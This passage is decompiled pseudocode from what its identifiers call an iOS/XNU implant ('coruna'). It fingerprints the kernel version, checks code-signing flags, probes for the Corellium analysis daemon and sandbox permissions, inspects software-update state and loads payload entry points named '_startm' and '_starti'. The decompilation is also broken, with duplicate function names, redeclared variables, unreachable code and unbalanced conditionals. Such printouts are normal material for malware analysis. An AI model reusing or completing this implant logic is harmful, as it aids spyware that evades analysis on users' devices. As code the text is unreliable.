  host_info[0xc0] = '\0';
  host_info[0xc1] = '\0';
  host_info[0xc2] = '\0';
  host_info[0xc3] = '\0';
  host_info[0xc4] = '\0';
  host_info[0xc5] = '\0';
  host_info[0xc6] = '\0';
  host_info[199] = '\0';
  host_info[0xd8] = '\0';
  host_info[0xd9] = '\0';
  host_info[0xda] = '\0';
  host_info[0xdb] = '\0';
  host_info[0xdc] = '\0';
  host_info[0xdd] = '\0';
  host_info[0xde] = '\0';
  host_info[0xdf] = '\0';
  host_info[0xd0] = '\0';
  host_info[0xd1] = '\0';
  host_info[0xd2] = '\0';
  host_info[0xd3] = '\0';
  host_info[0xd4] = '\0';
  host_info[0xd5] = '\0';
  host_info[0xd6] = '\0';
  host_info[0xd7] = '\0';
  host_info[0xa8] = '\0';
  host_info[0xa9] = '\0';
  host_info[0xaa] = '\0';
  host_info[0xab] = '\0';
  host_info[0xac] = '\0';
  host_info[0xad] = '\0';
  host_info[0xae] = '\0';
  host_info[0xaf] = '\0';
  host_info[0xa0] = '\0';
  host_info[0xa1] = '\0';
  host_info[0xa2] = '\0';
  host_info[0xa3] = '\0';
  host_info[0xa4] = '\0';
  host_info[0xa5] = '\0';
  host_info[0xa6] = '\0';
  host_info[0xa7] = '\0';
  host_info[0xb8] = '\0';
  host_info[0xb9] = '\0';
  host_info[0xba] = '\0';
  host_info[0xbb] = '\0';
  host_info[0xbc] = '\0';
  host_info[0xbd] = '\0';
  host_info[0xbe] = '\0';
  host_info[0xbf] = '\0';
  host_info[0xb0] = '\0';
  host_info[0xb1] = '\0';
  host_info[0xb2] = '\0';
  host_info[0xb3] = '\0';
  host_info[0xb4] = '\0';
  host_info[0xb5] = '\0';
  host_info[0xb6] = '\0';
  host_info[0xb7] = '\0';
  host_info[0x88] = '\0';
  host_info[0x89] = '\0';
  host_info[0x8a] = '\0';
  host_info[0x8b] = '\0';
  host_info[0x8c] = '\0';
  host_info[0x8d] = '\0';
  host_info[0x8e] = '\0';
  host_info[0x8f] = '\0';
  host_info[0x80] = '\0';
  host_info[0x81] = '\0';
  host_info[0x82] = '\0';
  host_info[0x83] = '\0';
  host_info[0x84] = '\0';
  host_info[0x85] = '\0';
  host_info[0x86] = '\0';
  host_info[0x87] = '\0';
  host_info[0x98] = '\0';
  host_info[0x99] = '\0';
  host_info[0x9a] = '\0';
  host_info[0x9b] = '\0';
  host_info[0x9c] = '\0';
  host_info[0x9d] = '\0';
  host_info[0x9e] = '\0';
  host_info[0x9f] = '\0';
  host_info[0x90] = '\0';
  host_info[0x91] = '\0';
  host_info[0x92] = '\0';
  host_info[0x93] = '\0';
  host_info[0x94] = '\0';
  host_info[0x95] = '\0';
  host_info[0x96] = '\0';
  host_info[0x97] = '\0';
  host_info[0x78] = '\0';
  host_info[0x79] = '\0';
  host_info[0x7a] = '\0';
  host_info[0x7b] = '\0';
  host_info[0x7c] = '\0';
  host_info[0x7d] = '\0';
  host_info[0x7e] = '\0';
  host_info[0x7f] = '\0';
  host_info[0x70] = '\0';
  host_info[0x71] = '\0';
  host_info[0x72] = '\0';
  host_info[0x73] = '\0';
  host_info[0x74] = '\0';
  host_info[0x75] = '\0';
  host_info[0x76] = '\0';
  host_info[0x77] = '\0';
  host_info[0x58] = '\0';
  host_info[0x59] = '\0';
  host_info[0x5a] = '\0';
  host_info[0x5b] = '\0';
  host_info[0x5c] = '\0';
  host_info[0x5d] = '\0';
  host_info[0x5e] = '\0';
  host_info[0x5f] = '\0';
  host_info[0x50] = '\0';
  host_info[0x51] = '\0';
  host_info[0x52] = '\0';
  host_info[0x53] = '\0';
  host_info[0x54] = '\0';
  host_info[0x55] = '\0';
  host_info[0x56] = '\0';
  host_info[0x57] = '\0';
  host_info[0x68] = '\0';
  host_info[0x69] = '\0';
  host_info[0x6a] = '\0';
  host_info[0x6b] = '\0';
  host_info[0x6c] = '\0';
  host_info[0x6d] = '\0';
  host_info[0x6e] = '\0';
  host_info[0x6f] = '\0';
  host_info[0x60] = '\0';
  host_info[0x61] = '\0';
  host_info[0x62] = '\0';
  host_info[99] = '\0';
  host_info[100] = '\0';
  host_info[0x65] = '\0';
  host_info[0x66] = '\0';
  host_info[0x67] = '\0';
  host_info[0x38] = '\0';
  host_info[0x39] = '\0';
  host_info[0x3a] = '\0';
  host_info[0x3b] = '\0';
  host_info[0x3c] = '\0';
  host_info[0x3d] = '\0';
  host_info[0x3e] = '\0';
  host_info[0x3f] = '\0';
  host_info[0x30] = '\0';
  host_info[0x31] = '\0';
  host_info[0x32] = '\0';
  host_info[0x33] = '\0';
  host_info[0x34] = '\0';
  host_info[0x35] = '\0';
  host_info[0x36] = '\0';
  host_info[0x37] = '\0';
  host_info[0x48] = '\0';
  host_info[0x49] = '\0';
  host_info[0x4a] = '\0';
  host_info[0x4b] = '\0';
  host_info[0x4c] = '\0';
  host_info[0x4d] = '\0';
  host_info[0x4e] = '\0';
  host_info[0x4f] = '\0';
  host_info[0x40] = '\0';
  host_info[0x41] = '\0';
  host_info[0x42] = '\0';
  host_info[0x43] = '\0';
  host_info[0x44] = '\0';
  host_info[0x45] = '\0';
  host_info[0x46] = '\0';
  host_info[0x47] = '\0';
  host_info[0x18] = '\0';
  host_info[0x19] = '\0';
  host_info[0x1a] = '\0';
  host_info[0x1b] = '\0';
  host_info[0x1c] = '\0';
  host_info[0x1d] = '\0';
  host_info[0x1e] = '\0';
  host_info[0x1f] = '\0';
  host_info[0x10] = '\0';
  host_info[0x11] = '\0';
  host_info[0x12] = '\0';
  host_info[0x13] = '\0';
  host_info[0x14] = '\0';
  host_info[0x15] = '\0';
  host_info[0x16] = '\0';
  host_info[0x17] = '\0';
  host_info[0x28] = '\0';
  host_info[0x29] = '\0';
  host_info[0x2a] = '\0';
  host_info[0x2b] = '\0';
  host_info[0x2c] = '\0';
  host_info[0x2d] = '\0';
  host_info[0x2e] = '\0';
  host_info[0x2f] = '\0';
  host_info[0x20] = '\0';
  host_info[0x21] = '\0';
  host_info[0x22] = '\0';
  host_info[0x23] = '\0';
  host_info[0x24] = '\0';
  host_info[0x25] = '\0';
  host_info[0x26] = '\0';
  host_info[0x27] = '\0';
  host_info[8] = '\0';
  host_info[9] = '\0';
  host_info[10] = '\0';
  host_info[0xb] = '\0';
  host_info[0xc] = '\0';
  host_info[0xd] = '\0';
  host_info[0xe] = '\0';
  host_info[0xf] = '\0';
  host_info[0] = '\0';
  host_info[1] = '\0';
  host_info[2] = '\0';
  host_info[3] = '\0';
  host_info[4] = '\0';
  host_info[5] = '\0';
  host_info[6] = '\0';
  host_info[7] = '\0';
  host = _mach_host_self();
  u = _host_kernel_version(host,host_info);
  if (u == 0) {
done:
    ptr = _strstr(host_info,"RELEASE");
    if (ptr == (char *)0x0) {
      u = 0xad008;
    }
    else {
      ptr = _strstr(host_info,"xnu-");
      u = 0xad014;
      if (ptr != (char *)0x0) {
        bootargs = 0;
        scratch = 0;
        err = _sscanf(ptr,"xnu-%u.%u.%u%*s");
        if (err == 3) {
          u = 0;
          *len = scratch;
          *(uint32_t *)(len + 1) = bootargs;
        }
      }
    }
  }
  else {
    if (u == 0x35) {
      thread_attr = k_implant_rodata_word_26a50;
      scratch = 0x200;
      err = _sysctl((int *)&thread_attr,2,host_info,&scratch,(void *)0x0,0);
      if (err == 0) goto done;
    }
    u = u | 0x80000000;
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t coruna_strncpy(long handle,char *path,uint *size)
{
  size_t ls1;
  long handle;
  uint64_t u;
  char *ptr;
  uint size;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && size != (uint *)0x0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    ptr = *(char **)(handle + 0x38);
    if (ptr == (char *)0x0) {
      size = 0;
    }
    else {
      ls1 = _strlen(ptr);
      size = (int)ls1 + 1;
      if (path != (char *)0x0) {
        if (*size < size) {
          return 0xad00c;
        }
        _strncpy(path,ptr,(unsigned long)*size);
      }
    }
    u = 0;
    *size = size;
  }
  return u;
}





uint64_t coruna_bzero_122f8(long handle)
{
  uint64_t u;
  size_t ls2;
  char *ptr;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    ptr = *(char **)(handle + 0x38);
    if (ptr == (char *)0x0) {
      u = 0;
    }
    else {
      ls2 = _strlen(ptr);
      _bzero(ptr,ls2);
      _free(*(void **)(handle + 0x38));
      u = 0;
      *(uint64_t *)(handle + 0x38) = 0;
    }
  }
  return u;
}





uint64_t coruna_strncpy_2(long handle,char *path,uint *size)
{
  size_t ls1;
  long handle;
  uint64_t u;
  char *ptr;
  uint size;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && size != (uint *)0x0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    ptr = *(char **)(handle + 0x48);
    if (ptr == (char *)0x0) {
      size = 0;
    }
    else {
      ls1 = _strlen(ptr);
      size = (int)ls1 + 1;
      if (path != (char *)0x0) {
        if (*size < size) {
          return 0xad00c;
        }
        _strncpy(path,ptr,(unsigned long)*size);
      }
    }
    u = 0;
    *size = size;
  }
  return u;
}





uint64_t coruna_bzero_1241c(long handle)
{
  uint64_t u;
  size_t ls2;
  char *ptr;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    ptr = *(char **)(handle + 0x48);
    if (ptr == (char *)0x0) {
      u = 0;
    }
    else {
      ls2 = _strlen(ptr);
      _bzero(ptr,ls2);
      _free(*(void **)(handle + 0x48));
      u = 0;
      *(uint64_t *)(handle + 0x48) = 0;
    }
  }
  return u;
}





uint64_t coruna_implant_residual_56(long handle,uint8_t *buf)
{
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (*(long *)(handle + 8) != 0 && buf != (uint8_t *)0x0)) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = 0;
    *buf = 1;
  }
  return u;
}





uint64_t coruna_implant_residual_57(long handle,char *path,uint64_t val,long addr_2)
{
  uint64_t u;
  long handle;
  
  if (((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && path != (char *)0x0)) &&
     (*path != '\0' && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x38))(*(long *)(handle + 8),path,addr_2);
    return u;
  }
  return 0xad001;
}





unsigned long coruna_run_startm(long arg,uint64_t val)

{
  uint u;
  uint size;
  uint type_id;
  unsigned long version;
  long *block;
  uint cache_42;
  mach_port_name_t json_buf;
  uint cache_43;
  void *frame;
  uint32_t cache_44;
  uint64_t cache_45;
  
  version = 0xad001;
  if ((arg != 0) && (block = *(long **)(arg + 8), block != (long *)0x0)) {
    cache_45 = 0;
    cache_44 = 0;
    if ((char)block[8] != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    version = (**(void (**)(*block + 0x18))(*block,0x80000,&cache_45,&cache_44);
    if ((int)version == 0) {
      frame = (void *)0x0;
      cache_43 = 0;
      version = (**(void (**)(*block + 0x20))(*block,&frame,&cache_43);
      if ((int)version == 0) {
        json_buf = 0;
        version = (**(void (**)(block[1] + 0x48))
                          (block[1],val,cache_45,cache_44,"_startm",frame,cache_43,0,
                           &json_buf);
        if ((int)version == 0) {
          cache_42 = 0xad000;
          type_id = (**(void (**)(block[1] + 0x58))(block[1],json_buf,2000,&cache_42);
          u = 0;
          if (type_id != 0x1e02a) {
            u = type_id;
          }
          size = cache_42;
          if (type_id != 0) {
            size = u;
          }
          version = (unsigned long)size;
          _mach_port_mod_refs(*(ipc_space_t *)k_implant_mach_task_self_slot,json_buf,1,-1);
        }
        _bzero(frame,(unsigned long)cache_43);
        _free(frame);
      }
    }
  }
  return version;
}





void coruna_csops_12674(long handle,byte *arg)
{
  pid_t lp1;
  int err;
  uint u;
  int *err;
  uint *ptr;
  byte err;
  uint8_t scratch[3];
  byte bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint32_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  thread_attr = 0;
  scratch = 0;
  host_info = 0;
  u = 0xad001;
  if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
  return;
  }
  ___stack_chk_fail(u);
  if (k_implant_rodata_word_26a58 <= *(double *)k_implant_dyldversionnumber_slot) {
    lp1 = _getpid();
    err = _csops(lp1,0,scratch,4);
    if (err < 0) goto done;
    err = bootargs >> 5 & 1;
  }
  else {
    lp1 = _getpid();
    err = _csops(lp1,5,&thread_attr,0x14);
    if (err < 0) {
      err = ___error();
      if (*err == 0x55) {
        u = 0;
        *arg = 0;
        if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
        return;
        }
        ___stack_chk_fail(u);
      }
done:
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
      return;
      }
      ___stack_chk_fail(u);
    }
    err = 1;
  }
  u = 0;
  *arg = err;
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_implant_via_check_softwareupdate(long handle,uint8_t *buf)
{
  uint64_t u;
  uint8_t scratch;
  
  u = 0xad001;
  if ((handle != 0) && (*(long *)(handle + 8) != 0 && buf != (uint8_t *)0x0)) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    scratch = 0;
    u = coruna_check_softwareupdate(&scratch);
    if ((int)u == 0) {
      *buf = scratch;
    }
  }
  return u;
}





void coruna_implant_via_host_get_special_port(long handle,uint8_t *buf)
{
  uint64_t u;
  int *err;
  long handle;
  long addr;
  long off;
  uint scratch [2];
  int *bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad001;
  if ((handle == 0) || (off = *(long *)(handle + 8), off == 0 || buf == (uint8_t *)0x0)
     if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
     return;
     }
     ___stack_chk_fail(u);
  addr = off;
  if (*(char *)(off + 0x40) != '\0') {
    UnkSytemRegWrite(3,4,0xf,2,7,0);
    InstructionSynchronizationBarrier();
    addr = *(long *)(handle + 8);
    if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return;
    }
    ___stack_chk_fail(u);
  }
  err = (int *)(addr + 0x44);
  if (*err + 1U < 2) {
    scratch[0] = 0x8000001c;
    handle = *(long *)(addr + 0x18);
    bootargs = err;
    if (handle == 0) {
      u = 0xad00a;
      if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
    u = (**(void (**)(handle + 0x40))(handle,addr + 0x20,scratch,1,0);
    if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return;
    }
    ___stack_chk_fail(u);
  }
  scratch[0] = scratch[0] & 0xffffff00;
  u = coruna_host_get_special_port(*(uint32_t *)(off + 0x44),scratch);
  if ((int)u == 0) {
    *buf = (uint8_t)scratch[0];
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t
uint64_t coruna_implant_residual_58(int64_t arg,int flags,int64_t arg,int count_2,int64_t val,int64_t n,int fd_3 )
{
  uint64_t u;
  long handle;
  
  if (((arg == 0) ||
      (handle = *(long *)(arg + 8),
      ((((handle == 0 || flags == 0) || flags == -1) || arg == 0) || count_2 == 0) ||
      val == 0)) || ((n == 0) == (fd_3 != 0))) {
    u = 0xad001;
  }
  else {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x40))();
  }
  return u;
}





uint64_t
uint64_t coruna_implant_residual_59(int64_t arg,int flags,int64_t arg,int count_2,int64_t val,int64_t n,int fd_3 )
{
  uint64_t u;
  long handle;
  
  if (((arg == 0) ||
      (handle = *(long *)(arg + 8),
      (((handle == 0 || flags < 1) || arg == 0) || count_2 == 0) || val == 0)) ||
     ((n == 0) == (fd_3 != 0))) {
    u = 0xad001;
  }
  else {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x48))();
  }
  return u;
}





uint64_t
uint64_t coruna_implant_residual_60(int64_t arg,int64_t arg,uint64_t val,int64_t val,int flags,int64_t n, int64_t m,int count_2)
{
  uint64_t u;
  long handle;
  
  if (((arg == 0) ||
      (handle = *(long *)(arg + 8),
      (((handle == 0 || arg == 0) || val == 0) || flags == 0) || n == 0)) ||
     ((m == 0) == (count_2 != 0))) {
    u = 0xad001;
  }
  else {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x50))();
  }
  return u;
}





uint64_t coruna_driver_copy_port_1918(long handle,int flags,uint64_t val,long addr_2)
{
  uint64_t u;
  long handle;
  
  if ((handle != 0) &&
     (handle = *(long *)(handle + 8),
     ((handle != 0 && flags != 0) && flags != -1) && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x58))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_61(long handle,char *path,long addr_2)
{
  uint64_t u;
  long handle;
  
  if (((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && path != (char *)0x0)) &&
     (*path != '\0' && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x38))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_62(long handle,char *path,uint64_t val,long addr_2)
{
  uint64_t u;
  long handle;
  
  if (((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && path != (char *)0x0)) &&
     (*path != '\0' && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x60))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_run_starti(long handle)
{
  uint64_t *ptr;
  uint64_t *buf;
  short *lps3;
  uint64_t u;
  long handle;
  void (*scratch)(void);
  uint32_t bootargs;
  uint64_t thread_attr;
  uint32_t host_info;
  uint64_t serial_buf;
  uint32_t action;
  uint64_t block_ctx;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0)) {
    block_ctx = 0;
    action = 0;
    u = (**(void (**)(handle + 0x68))(handle,0x30000,&block_ctx,&action);
    if ((int)u == 0x7003) {
      u = 0xad006;
    }
    else if ((int)u == 0) {
      if (*(long *)(handle + 0x18) == 0) {
        u = 0xad00a;
      }
      else {
        serial_buf = 0;
        host_info = 0;
        u = (**(void (**)(handle + 0x68))(handle,0x40000,&serial_buf,&host_info);
        if ((int)u == 0) {
          thread_attr = 0;
          bootargs = 0;
          u = (**(void (**)(handle + 0x68))(handle,0x90000,&thread_attr,&bootargs);
          if ((int)u == 0) {
            ptr = (uint64_t *)(handle + 0x28);
            u = (**(void (**)(handle + 0x50))(handle,block_ctx,action,ptr);
            if ((int)u == 0) {
              scratch = (void (*)0x0;
              u = (**(void (**)(handle + 0x58))(handle,*ptr,"_starti",&scratch);
              if ((int)u == 0) {
                buf = (uint64_t *)(handle + 0x30);
                u = (*scratch)(buf,serial_buf,host_info,thread_attr,bootargs,
                                    *(uint64_t *)(handle + 0x18),*(uint64_t *)(handle + 0x20));
                if ((int)u == 0) {
                  lps3 = (short *)*buf;
                  if (((lps3 != (short *)0x0) && (*lps3 == 4)) && (lps3[1] != 0)) {
                    return 0;
                  }
                  *buf = 0;
                  u = 0xad006;
                }
              }
              (**(void (**)(handle + 0x60))(handle,*ptr);
              *ptr = 0;
            }
          }
        }
      }
    }
  }
  return u;
}





uint64_t coruna_macho_iface_create(long handle,uint64_t *val)
{
  uint32_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (val != (uint64_t *)0x0)) {
    ptr = _calloc(1,0x50);
    if (ptr == (uint32_t *)0x0) {
      u = 0xad009;
    }
    else {
      u = 0;
      *ptr = 0x20002;
      *(long *)(ptr + 2) = handle;
      ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_ctx_free_slot;
      ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 0xe))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 0x10))[0] = coruna_driver_free_ctx;
      ((void (**)(void *, long, uint64_t))(ptr + 0x12))[0] = coruna_dyld_port_index;
      *val = ptr;
    }
  }
  return u;
}





uint64_t coruna_ctx_free_slot(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_free_ctx(uint64_t *val)
{
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return 0;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x18))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x20))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x28))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x30))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x38))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_free_ctx(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x40))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_dyld_port_index(long handle,long addr_2)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 != 0)) {
    u = (**(void (**)(*(long *)(handle + 8) + 0x48))();
    return u;
  }
  return 0xad001;
}





uint coruna_check_softwareupdate(uint8_t *buf)
{
  bool err;
  int err;
  uint u;
  int *err;
  long handle;
  long addr;
  char *ptr;
  uint *ptr;
  stat scratch;
  
  if (buf == (uint8_t *)0x0) {
    return 0xad001;
  }
  scratch.st_gen = 0;
  scratch.st_lspare = 0;
  scratch.st_blksize = 0;
  scratch.st_flags = 0;
  scratch.st_qspare[1] = 0;
  scratch.st_qspare[0] = 0;
  scratch.st_birthtimespec.tv_nsec = 0;
  scratch.st_birthtimespec.tv_sec = 0;
  scratch.st_blocks = 0;
  scratch.st_size = 0;
  scratch.st_mtimespec.tv_nsec = 0;
  scratch.st_mtimespec.tv_sec = 0;
  scratch.st_ctimespec.tv_nsec = 0;
  scratch.st_ctimespec.tv_sec = 0;
  scratch.st_rdev = 0;
  scratch = 0;
  scratch.st_uid = 0;
  scratch.st_gid = 0;
  scratch.st_atimespec.tv_nsec = 0;
  scratch.st_atimespec.tv_sec = 0;
  scratch.st_ino = 0;
  scratch.st_dev = 0;
  scratch.st_mode = 0;
  scratch.st_nlink = 0;
  err = _lstat("/private/var/MobileSoftwareUpdate/Update.plist",&scratch);
  if (err == 0) {
    *buf = 1;
    return 0;
  }
  err = ___error();
  if (*err == 2) {
    handle = _opendir("/private/var/MobileSoftwareUpdate/");
    if (handle == 0) {
      err = ___error();
      if (*err != 2) goto fail;
      err = false;
    }
    else {
      do {
        addr = _readdir(handle);
        if (addr == 0) break;
        ptr = _strstr((char *)(addr + 0x15),"softwareupdate.");
      } while ((char *)(addr + 0x15) != ptr);
      err = addr != 0;
      _closedir(handle);
    }
    u = 0;
    *buf = err;
  }
  else {
fail:
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  return u;
}





uint coruna_host_get_special_port(host_priv_t arg,long handle)
{
  bool err;
  uint u;
  uint size;
  long handle;
  bool status;
  mach_port_t scratch;
  
  if (arg + 1 < 2 || handle == 0) {
    size = 0xad001;
  }
  else {
    handle = 0;
    scratch = 0;
    err = true;
    do {
      status = err;
      u = _host_get_special_port(arg,-1,(&k_implant_rodata_word_26a60)[handle],&scratch);
      if (u != 0) {
        return u | 0x80000000;
      }
      u = scratch + 1;
      if (1 < u) {
        _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch);
        break;
      }
      handle = 1;
      err = false;
    } while (status);
    size = 0;
    *(bool *)handle = 1 < u;
  }
  return size;
}





void coruna_get_platform_serial(long out_serial)
{
  bool err;
  bool status;
  int err;
  pid_t lp4;
  long handle;
  long addr;
  uint32_t *ptr;
  void (*ptr)(void);
  void (*buf)(void);
  void (*str)(void);
  uint64_t u;
  long off;
  long base;
  long ctx_val;
  long serial;
  uint size;
  unsigned long version;
  int status;
  uint64_t port;
  stat scratch;
  long bootargs;
  unsigned long scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  if (out_serial == 0) {
    u = 0xffffffff;
    if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return;
    }
    ___stack_chk_fail(u);
  }
  handle = coruna_identity(k_implant_get_cpu_capabilities_slot);
  version = *(unsigned long *)(handle + 0xc) & 0xffffffffffffff00;
  if (version == 0) {
    u = 0xfffffffe;
    if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return;
    }
    ___stack_chk_fail(u);
  }
  status = false;
  err = *(int *)(version + 0x80);
  if (err < 0x1b588bb3) {
    err = err == -0x789a1216;
    status = -0x25cc27c3;
  }
  else {
    err = err == 0x1b588bb3 || err == 0x462504d2;
    status = 0x2876f5b5;
  }
  if (err || err == status) {
    host_info = 0;
    thread_attr = 0;
    action = 0;
    serial_buf = 0;
    scratch = 0;
    bootargs = 0;
    thread_attr = 0;
    bootargs = 0;
    scratch.st_gen = 0;
    scratch.st_lspare = 0;
    scratch.st_blksize = 0;
    scratch.st_flags = 0;
    scratch.st_qspare[1] = 0;
    scratch.st_qspare[0] = 0;
    scratch.st_birthtimespec.tv_nsec = 0;
    scratch.st_birthtimespec.tv_sec = 0;
    scratch.st_blocks = 0;
    scratch.st_size = 0;
    scratch.st_mtimespec.tv_nsec = 0;
    scratch.st_mtimespec.tv_sec = 0;
    scratch.st_ctimespec.tv_nsec = 0;
    scratch.st_ctimespec.tv_sec = 0;
    scratch.st_rdev = 0;
    scratch = 0;
    scratch.st_uid = 0;
    scratch.st_gid = 0;
    scratch.st_atimespec.tv_nsec = 0;
    scratch.st_atimespec.tv_sec = 0;
    scratch.st_ino = 0;
    scratch.st_dev = 0;
    scratch.st_mode = 0;
    scratch.st_nlink = 0;
    err = _stat("/usr/libexec/corelliumd",&scratch);
    if (err == 0) {
      status = false;
    }
    else {
      lp4 = _getpid();
      err = _sandbox_check(lp4,"iokit-get-properties",
                             *(uint32_t *)k_implant_sandbox_check_no_report_slot);
      if ((err < 1) &&
         (addr = _dlopen("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit",1),
         addr != 0)) {
        ptr = (uint32_t *)_dlsym(addr,"kIOMasterPortDefault");
        ptr = (void (*)_dlsym(addr,"IORegistryEntryFromPath");
